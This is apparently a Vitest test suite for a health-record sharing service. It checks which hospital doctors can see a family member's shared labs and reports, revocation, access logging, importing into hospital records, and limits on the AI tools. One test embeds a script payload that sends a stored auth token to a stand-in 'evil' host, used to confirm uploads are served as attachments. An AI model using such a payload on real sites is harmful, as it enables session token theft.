import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js'
import { describe, expect, it } from 'vitest'
import { Accounts } from '../src/auth/accounts.ts'
import { BotGuard, solveChallenge, type Challenge } from '../src/auth/bot-guard.ts'
import { issueToken, verifyToken } from '../src/auth/token.ts'
import { TenantService } from '../src/auth/tenants.ts'
import { ClaimService } from '../src/claims/service.ts'
import { PostCheck } from '../src/collab/postcheck.ts'
import type { HarnessPool } from '../src/harness/pool.ts'
import { buildApi } from '../src/http/api.ts'
import { makeInvoker } from '../src/http/invoke.ts'
import type { CrossrefClient } from '../src/literature/crossref.ts'
import type { PubMedClient } from '../src/literature/pubmed.ts'
import { buildMcpServer } from '../src/mcp/server.ts'
import { TurnRegistry } from '../src/mcp/turns.ts'
import { Documents } from '../src/model/runtime.ts'
import { OpService } from '../src/ops/service.ts'
import { SlideRenderer } from '../src/render/slides.ts'
import { Store } from '../src/store/db.ts'
import { kekFrom, TenantKeys } from '../src/tenancy/keys.ts'
import { PatientService } from '../src/tenancy/patients.ts'
import { ShareService } from '../src/tenancy/shares.ts'
import { TurnService } from '../src/turns/service.ts'

/**
 * 知家「分享给医生」（docs/design/SHARING.md）：家人选医院 → 科室（可指定医生）；医生只读实时视图、按家人允许纳入本院；
 * 医生的 AI 与医生本人一致（只受本院「患者数据不发外部模型」约束，不给 AI「给医生看的姓名」）。
 */
const SECRET = 'test-secret'

async function setup() {
  const store = new Store(':memory:')
  const docs = new Documents(store)
  const pool = { liveSession: () => null, run: () => new Promise(() => {}), cancel: async () => {}, workspaceDir: () => mkdtempSync(join(tmpdir(), 'sh-ws-')) } as unknown as HarnessPool
  const accounts = new Accounts(store, { secret: SECRET, devMode: false, devToken: 'dev', devUser: 'dev', botGuard: new BotGuard({ secret: SECRET, baseMax: 300, minDelayMs: 0 }) })
  // 本测试要注册 9 个账号：关掉注册频率限制（每 IP 每小时 5 个）
  ;(accounts as unknown as { registerLimit: { hit: () => boolean } }).registerLimit = { hit: () => false }
  const tenants = new TenantService(store, { devMode: false })
  const patients = new PatientService(mkdtempSync(join(tmpdir(), 'sh-pt-')), tenants, new TenantKeys(store, kekFrom({ secret: SECRET })), store, null,
    ({ owner, title }) => docs.create({ owner, title }).id)
  const shares = new ShareService(store, tenants, patients, docs)
  const ops = new OpService(docs)
  const app = buildApi({
    docs, ops, turns: new TurnService(docs, pool, new TurnRegistry()), postcheck: new PostCheck(docs), crossref: {} as CrossrefClient,
    renderer: new SlideRenderer(mkdtempSync(join(tmpdir(), 'sh-r-'))), accounts, devMode: false, devUser: 'dev', patients, shares,
  })
  const call = async (method: string, path: string, token?: string, body?: unknown, form?: FormData) => {
    if (/^\/api\/auth\/register$/.test(path)) body = { ...(body as object), pow: solveChallenge((await (await app.request('/api/auth/challenge')).json()) as Challenge) }
    const res = await app.request(path, { method, headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}), ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}) }, body: form ?? (body !== undefined ? JSON.stringify(body) : undefined) })
    const text = await res.text()
    let json: any = null
    try { json = JSON.parse(text) } catch { /* 非 JSON */ }
    return { status: res.status, json, text, headers: res.headers }
  }
  const register = async (username: string, invite?: string) => (await call('POST', '/api/auth/register', undefined, { username, password: 'passw0rd123', ...(invite ? { invite } : {}) })).json
  const op = await register('operator')
  const orgA = (await call('POST', '/api/platform/tenants', op.token, { name: '省立医院' })).json
  if (!orgA?.tenant) throw new Error('建医院失败 ' + JSON.stringify({ op, orgA }).slice(0, 400))
  const adminA = await register('adminA', orgA.invite.code)
  const joinA = async (u: string) => register(u, (await call('POST', '/api/tenant/invites', adminA.token, {})).json.code)
  const cardio = await joinA('cardio') // 心内科医生
  const cardio2 = await joinA('cardio2') // 心内科另一位医生
  const neuro = await joinA('neuro') // 神经科医生
  const orgB = (await call('POST', '/api/platform/tenants', op.token, { name: '别的医院' })).json
  const docB = await register('docB', orgB.invite.code)
  const dCardio = (await call('POST', '/api/tenant/departments', adminA.token, { name: '心内科' })).json
  const dNeuro = (await call('POST', '/api/tenant/departments', adminA.token, { name: '神经科' })).json
  await call('PUT', `/api/tenant/departments/${dCardio.id}/members`, adminA.token, { user_ids: [cardio.user.id, cardio2.user.id] })
  await call('PUT', `/api/tenant/departments/${dNeuro.id}/members`, adminA.token, { user_ids: [neuro.user.id] })
  // 家人（知家）：建成员、录化验、上传一份报告并确认
  const mom = await register('mother1')
  if (!mom?.token) throw new Error('注册失败 ' + JSON.stringify(mom))
  const other = await register('otherfamily')
  const member = (await call('POST', '/api/patients', mom.token, { name: '妈妈', sex: 'F', birth_year: 1960, tags: ['高血压'] })).json
  await call('POST', `/api/patients/${member.id}/labs`, mom.token, { test_name: '空腹血糖', value: 7.4, unit: 'mmol/L', collected_on: '2026-03-01' })
  await call('POST', `/api/patients/${member.id}/labs`, mom.token, { test_name: '收缩压', value: 148, unit: 'mmHg', collected_on: '2026-09-01' })
  const form = new FormData(); form.append('file', new File(['报告原件内容'], 'report.pdf', { type: 'application/pdf' })); form.append('kind', 'lab_report'); form.append('report_date', '2026-09-10')
  const upRes = await call('POST', `/api/patients/${member.id}/files`, mom.token, undefined, form)
  if (!upRes.json?.record) throw new Error('上传失败 ' + upRes.status + ' ' + upRes.text.slice(0, 200))
  const up = upRes.json
  await call('POST', `/api/patients/${member.id}/records/${up.record.id}/labs`, mom.token, { test_name: '肌酐', value: 88, unit: 'µmol/L' })
  await call('POST', `/api/patients/${member.id}/records/${up.record.id}/confirm`, mom.token, {})
  const share = async (body: Record<string, unknown>) => call('POST', `/api/phr/${member.id}/shares`, mom.token, { tenant_id: orgA.tenant.id, department_id: dCardio.id, ...body })
  const mcp = async (userId: string) => {
    const claims = verifyToken(SECRET, issueToken(SECRET, { u: userId, d: '*', p: ['read', 'write'], aud: 'mcp', ttlSeconds: 60 }), 'mcp')!
    const server = buildMcpServer({
      docs, ops, turns: new TurnRegistry(), secret: SECRET, claims: new ClaimService(docs, {} as PubMedClient), renderer: new SlideRenderer(mkdtempSync(join(tmpdir(), 'sh-r2-'))),
      pubmed: {} as PubMedClient, crossref: {} as CrossrefClient, workspaceDir: () => mkdtempSync(join(tmpdir(), 'sh-mws-')), isLiveSession: () => true, patients, shares, invoke: makeInvoker(app),
    }, claims)
    const [a, b] = InMemoryTransport.createLinkedPair()
    await server.connect(a)
    const client = new Client({ name: 'sh', version: '0' })
    await client.connect(b)
    return async (name: string, args: Record<string, unknown>) => {
      const r = await client.callTool({ name, arguments: args }) as { isError?: boolean; content: Array<{ text?: string }> }
      const text = r.content.map(c => c.text ?? '').join('')
      return { error: Boolean(r.isError), text, json: (() => { try { return JSON.parse(text) } catch { return null } })() }
    }
  }
  return { store, docs, tenants, patients, call, share, mcp, op, orgA, orgB, adminA, cardio, cardio2, neuro, docB, dCardio, dNeuro, mom, other, member, up }
}

describe('知家分享：目录与新建', () => {
  it('目录只列接受分享的医院、科室与医生（只给名称）；关掉「接受家庭分享」后不再出现', async () => {
    const t = await setup()
    const dir = (await t.call('GET', '/api/phr/directory', t.mom.token)).json
    const a = dir.find((h: { id: string }) => h.id === t.orgA.tenant.id)
    expect(a.name).toBe('省立医院')
    expect(a.departments.map((d: { name: string }) => d.name).sort()).toEqual(['心内科', '神经科'].sort())
    expect(Object.keys(a.departments[0].doctors[0]).sort()).toEqual(['display_name', 'id'])
    expect(dir.some((h: { id: string }) => h.id === t.orgB.tenant.id)).toBe(false) // 没有科室的医院不列
    await t.call('PATCH', '/api/tenant', t.adminA.token, { settings: { accept_patient_shares: false } })
    expect((await t.call('GET', '/api/phr/directory', t.mom.token)).json).toEqual([])
    expect((await t.share({})).status).toBe(400)
  })

  it('新建：只能在个人空间、只能分享自己的成员；科室必须属于那家医院，指定的医生必须在科室里', async () => {
    const t = await setup()
    expect((await t.share({ days: 7, allow_import: true, display_name: '王桂兰' })).status).toBe(201)
    expect((await t.share({ department_id: 'dpnone' })).status).toBe(400)
    expect((await t.share({ doctor_id: t.neuro.user.id })).status).toBe(400) // 神经科医生不在心内科
    expect((await t.share({ doctor_id: t.cardio.user.id })).status).toBe(201)
    expect((await t.call('POST', `/api/phr/${t.member.id}/shares`, t.other.token, { tenant_id: t.orgA.tenant.id, department_id: t.dCardio.id })).status).toBe(404) // 别的家庭
    // 医院端的患者不能经知家分享：/api/phr/* 按个人空间取患者库，医院患者在那里不存在（双重身份，TENANCY.md）
    const hp = (await t.call('POST', '/api/patients', t.cardio.token, { sex: 'M' })).json
    expect((await t.call('POST', `/api/phr/${hp.id}/shares`, t.cardio.token, { tenant_id: t.orgA.tenant.id, department_id: t.dCardio.id })).status).toBe(404)
  })
})

describe('知家分享：医生一侧的权限矩阵', () => {
  it('科室内医生能看；别的科室、别的医院、家人自己、平台运营都看不到；指定医生时只有那位医生能看', async () => {
    const t = await setup()
    const s1 = (await t.share({ display_name: '王桂兰' })).json
    const s2 = (await t.share({ doctor_id: t.cardio.user.id })).json
    const see = async (token: string, id: string) => (await t.call('GET', `/api/shares/${id}`, token)).status
    expect(await see(t.cardio.token, s1.id)).toBe(200)
    expect(await see(t.cardio2.token, s1.id)).toBe(200)
    expect(await see(t.neuro.token, s1.id)).toBe(404)
    expect(await see(t.docB.token, s1.id)).toBe(404)
    expect(await see(t.adminA.token, s1.id)).toBe(404) // 管理员不在科室里
    expect(await see(t.mom.token, s1.id)).toBe(404) // 家人自己的个人空间不是收件方
    expect(await see(t.op.token, s1.id)).toBe(404)
    expect(await see(t.cardio.token, s2.id)).toBe(200)
    expect(await see(t.cardio2.token, s2.id)).toBe(404)
    // 收件箱
    expect((await t.call('GET', '/api/shares', t.cardio.token)).json.map((s: { share_id: string }) => s.share_id).sort()).toEqual([s1.id, s2.id].sort())
    expect((await t.call('GET', '/api/shares', t.cardio2.token)).json.map((s: { share_id: string }) => s.share_id)).toEqual([s1.id])
    expect((await t.call('GET', '/api/shares', t.neuro.token)).json).toEqual([])
    // 给医生看的姓名：医生界面有
    expect((await t.call('GET', `/api/shares/${s1.id}`, t.cardio.token)).json.display_name).toBe('王桂兰')
  })

  it('撤销立即生效；到期自动失效；删掉科室后也失效', async () => {
    const t = await setup()
    const s = (await t.share({})).json
    expect((await t.call('GET', `/api/shares/${s.id}`, t.cardio.token)).status).toBe(200)
    expect((await t.call('DELETE', `/api/phr/shares/${s.id}`, t.other.token)).status).toBe(404) // 别的家庭撤不了
    expect((await t.call('DELETE', `/api/phr/shares/${s.id}`, t.mom.token)).status).toBe(200)
    expect((await t.call('GET', `/api/shares/${s.id}`, t.cardio.token)).status).toBe(404)
    expect((await t.call('GET', `/api/phr/${t.member.id}/shares`, t.mom.token)).json[0].status).toBe('revoked')
    const e = (await t.share({})).json
    t.store.db.prepare('UPDATE phr_shares SET expires_at = ? WHERE id = ?').run('2000-01-01T00:00:00.000Z', e.id)
    expect((await t.call('GET', `/api/shares/${e.id}`, t.cardio.token)).status).toBe(404)
    expect((await t.call('GET', `/api/phr/${t.member.id}/shares`, t.mom.token)).json.find((x: { id: string }) => x.id === e.id).status).toBe('expired')
    const g = (await t.share({})).json
    await t.call('DELETE', `/api/tenant/departments/${t.dCardio.id}`, t.adminA.token)
    expect((await t.call('GET', `/api/shares/${g.id}`, t.cardio.token)).status).toBe(404)
  })
})

describe('知家分享：范围、访问记录、纳入本院', () => {
  it('范围按类目与起始日期过滤；报告原件只能下载范围内的', async () => {
    const t = await setup()
    const onlyLabs = (await t.share({ scope: { categories: ['labs'], since: '2026-06-01' } })).json
    const v = (await t.call('GET', `/api/shares/${onlyLabs.id}`, t.cardio.token)).json
    expect(v.records).toEqual([])
    expect(v.documents).toEqual([])
    const labs = (await t.call('GET', `/api/shares/${onlyLabs.id}/labs`, t.cardio.token)).json
    expect(labs.map((l: { test_name: string }) => l.test_name).sort()).toEqual(['收缩压', '肌酐'].sort()) // 3 月的血糖在范围外
    expect((await t.call('GET', `/api/shares/${onlyLabs.id}/files/${t.up.file_id}`, t.cardio.token)).status).toBe(404)
    const all = (await t.share({})).json
    const full = (await t.call('GET', `/api/shares/${all.id}`, t.cardio.token)).json
    expect(full.records).toHaveLength(1)
    expect(full.documents.map((d: { kind: string }) => d.kind)).toEqual(['archive']) // 健康档案
    const f = await t.call('GET', `/api/shares/${all.id}/files/${t.up.file_id}`, t.cardio.token)
    expect(f.status).toBe(200)
    expect(f.text).toContain('报告原件内容')
    const doc = (await t.call('GET', `/api/shares/${all.id}/docs/${full.documents[0].doc_id}`, t.cardio.token)).json
    expect(typeof doc.html).toBe('string')
    // 不在分享里的文档 id 一律不存在
    expect((await t.call('GET', `/api/shares/${all.id}/docs/nope`, t.cardio.token)).status).toBe(404)
  })

  it('家人上传的原件不按自报 MIME 内联：伪装成 HTML 的「化验单」只能作为二进制附件下载', async () => {
    const t = await setup()
    const form = new FormData()
    form.append('file', new File(['<script>fetch("//evil/?"+localStorage["heurion.token"])</script>'], 'lab.html', { type: 'text/html' }))
    form.append('kind', 'lab_report')
    const up = (await t.call('POST', `/api/patients/${t.member.id}/files`, t.mom.token, undefined, form)).json
    await t.call('POST', `/api/patients/${t.member.id}/records/${up.record.id}/confirm`, t.mom.token, {})
    const s = (await t.share({})).json
    const f = await t.call('GET', `/api/shares/${s.id}/files/${up.file_id}`, t.cardio.token)
    expect(f.status).toBe(200)
    expect(f.headers.get('Content-Type')).toBe('application/octet-stream')
    expect(f.headers.get('Content-Disposition')).toMatch(/^attachment;/)
    expect(f.headers.get('X-Content-Type-Options')).toBe('nosniff')
    // 患者页同样不内联
    const own = await t.call('GET', `/api/patients/${t.member.id}/files/${up.file_id}`, t.mom.token)
    expect(own.headers.get('Content-Type')).toBe('application/octet-stream')
  })

  it('每次查看 / 下载都记到家人那边该成员的访问日志（医院 · 科室）', async () => {
    const t = await setup()
    const s = (await t.share({})).json
    await t.call('GET', `/api/shares/${s.id}`, t.cardio.token)
    await t.call('GET', `/api/shares/${s.id}/files/${t.up.file_id}`, t.cardio.token)
    const log = (await t.call('GET', `/api/patients/${t.member.id}/access-log`, t.mom.token)).json as Array<{ user: string; action: string; detail: string }>
    expect(log.some(l => l.action === 'share_view' && l.user === 'cardio' && l.detail.includes('省立医院 · 心内科'))).toBe(true)
    expect(log.some(l => l.action === 'share_file' && l.user === 'cardio')).toBe(true)
    expect(log.some(l => l.action === 'share_create')).toBe(true)
  })

  it('纳入本院：家人允许时才行；复制成本院患者（新代号），化验、报告原件、档案带来源；手工录入的仍标手工；撤销不影响已纳入的', async () => {
    const t = await setup()
    const no = (await t.share({})).json
    expect((await t.call('POST', `/api/shares/${no.id}/import`, t.cardio.token)).status).toBe(403)
    const s = (await t.share({ allow_import: true })).json
    const r = await t.call('POST', `/api/shares/${s.id}/import`, t.cardio.token)
    expect(r.status).toBe(201)
    const pid = r.json.id
    expect((await t.call('POST', `/api/shares/${s.id}/import`, t.cardio.token)).status).toBe(409)
    const p = (await t.call('GET', `/api/patients/${pid}`, t.cardio.token)).json
    expect(p.name).toBeNull() // 医院端不存称呼
    expect(p.records).toHaveLength(1)
    expect(p.documents.length).toBe(1)
    const labs = (await t.call('GET', `/api/patients/${pid}/labs`, t.cardio.token)).json as Array<{ test_name: string; source: string; origin: string; record_id: string | null }>
    expect(labs.find(l => l.test_name === '肌酐')).toMatchObject({ source: 'share', origin: `share:${s.id}` })
    expect(labs.find(l => l.test_name === '空腹血糖')).toMatchObject({ source: 'manual', record_id: null })
    expect((await t.call('GET', `/api/patients/${pid}/files/${p.records[0].file_id}`, t.cardio.token)).text).toContain('报告原件内容')
    // 家人看到纳入情况；撤销后医生看不到分享，但已纳入的仍在
    const mine = (await t.call('GET', `/api/phr/${t.member.id}/shares`, t.mom.token)).json.find((x: { id: string }) => x.id === s.id)
    expect(mine.imported.by).toBe('cardio')
    await t.call('DELETE', `/api/phr/shares/${s.id}`, t.mom.token)
    expect((await t.call('GET', `/api/shares/${s.id}`, t.cardio.token)).status).toBe(404)
    expect((await t.call('GET', `/api/patients/${pid}`, t.cardio.token)).status).toBe(200)
  })
})

describe('知家分享：AI 与医生本人一致', () => {
  it('医生的 AI 能列出、读取、看化验与报告文字；不返回「给医生看的姓名」；受本院「患者数据不发外部模型」约束', async () => {
    const t = await setup()
    const s = (await t.share({ display_name: '王桂兰', allow_import: true })).json
    const ai = await t.mcp(t.cardio.user.id)
    const list = await ai('share_list', {})
    expect(list.json.map((x: { share_id: string }) => x.share_id)).toEqual([s.id])
    expect(list.text).not.toContain('王桂兰')
    const read = await ai('share_read', { share_id: s.id })
    expect(read.json.latest_labs.length).toBeGreaterThan(0)
    expect(read.text).not.toContain('王桂兰')
    expect((await ai('share_read', { share_id: s.id, doc_id: read.json.documents[0].doc_id })).json.markdown).toBeTypeOf('string')
    expect((await ai('share_labs', { share_id: s.id, tests: ['肌酐'] })).json).toHaveLength(1)
    expect((await ai('share_file', { share_id: s.id, record_id: t.up.record.id })).error).toBe(false)
    // 别的科室医生的 AI 看不到
    expect((await (await t.mcp(t.neuro.user.id))('share_read', { share_id: s.id })).error).toBe(true)
    // 纳入：本院默认 AI 写入需医生确认 → AI 不能直接纳入
    const imp = await ai('share_import', { share_id: s.id })
    expect(imp.error).toBe(true)
    expect(imp.text).toContain('needs_human_review')
    // AI 的读取也记在家人那边（via ai）
    const log = (await t.call('GET', `/api/patients/${t.member.id}/access-log`, t.mom.token)).json as Array<{ action: string; via: string }>
    expect(log.some(l => l.action === 'share_view' && l.via === 'ai')).toBe(true)
    // 本院设置「患者数据不发外部模型」后 AI 读不到
    await t.call('PATCH', '/api/tenant', t.adminA.token, { settings: { external_model_for_patients: false } })
    expect((await ai('share_read', { share_id: s.id })).text).toContain('external_model_off')
  })

  it('本院设置 AI 写入直接生效时，AI 能纳入本院', async () => {
    const t = await setup()
    const s = (await t.share({ allow_import: true })).json
    await t.call('PATCH', '/api/tenant', t.adminA.token, { settings: { ai_patient_writes: 'direct' } })
    const r = await (await t.mcp(t.cardio.user.id))('share_import', { share_id: s.id })
    expect(r.error).toBe(false)
    expect(r.json.code).toMatch(/^P-/)
  })

  it('家人的 AI：能列出与撤销分享；新建分享只生成确认卡（对外披露要本人确认）', async () => {
    const t = await setup()
    const ai = await t.mcp(t.mom.user.id)
    const pending = await ai('phr_share', { action: 'create', patient_id: t.member.id, tenant_id: t.orgA.tenant.id, department_id: t.dCardio.id, reason: '下周去心内科复诊' })
    expect(pending.text).toContain('pending_confirmation')
    expect((await t.call('GET', `/api/phr/${t.member.id}/shares`, t.mom.token)).json).toEqual([])
    const s = (await t.share({})).json
    expect((await ai('phr_share', { action: 'list', patient_id: t.member.id })).text).toContain(s.id)
    expect((await ai('phr_share', { action: 'revoke', share_id: s.id })).error).toBe(false)
    expect((await t.call('GET', `/api/shares/${s.id}`, t.cardio.token)).status).toBe(404)
  })

  it('科室：管理员增删改、分配成员；普通成员只能看；成员调整经 AI 时要确认', async () => {
    const t = await setup()
    expect((await t.call('POST', '/api/tenant/departments', t.cardio.token, { name: '急诊科' })).status).toBe(403)
    expect((await t.call('GET', '/api/tenant/departments', t.cardio.token)).status).toBe(200)
    expect((await t.call('PUT', `/api/tenant/departments/${t.dCardio.id}/members`, t.adminA.token, { user_ids: [t.docB.user.id] })).status).toBe(400) // 别的医院的人
    expect((await t.call('POST', '/api/tenant/departments', t.mom.token, { name: '家' })).status).toBe(400) // 个人空间没有科室
    const ai = await t.mcp(t.adminA.user.id)
    expect((await ai('tenant_admin', { action: 'create_department', name: '急诊科' })).error).toBe(false)
    expect((await ai('tenant_admin', { action: 'set_department_members', department_id: t.dCardio.id, user_ids: [t.cardio.user.id], reason: '调整' })).text).toContain('pending_confirmation')
  })
})
